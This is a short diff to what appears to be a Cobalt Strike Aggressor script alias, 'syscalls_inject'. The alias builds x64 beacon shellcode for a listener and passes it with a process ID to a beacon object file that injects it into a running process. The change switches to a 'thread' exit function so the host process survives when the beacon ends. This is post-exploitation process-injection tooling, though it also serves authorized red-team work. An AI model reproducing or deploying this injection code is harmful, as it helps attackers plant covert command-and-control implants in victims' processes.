@@ -49,7 +49,8 @@ alias syscalls_inject {
 		berror($1, "Could not find listener $3");
 	}
 	else {
-		$sc_data = artifact_payload($3, "raw", "x64");
+		# Exit function is thread, as we're injecting into an existing process we likely don't wanna terminate on beacon exit.
+		$sc_data = payload($3, "x64", "thread");
 
 		# pack our arguments
 		$args = bof_pack($1, "ib", $2, $sc_data);
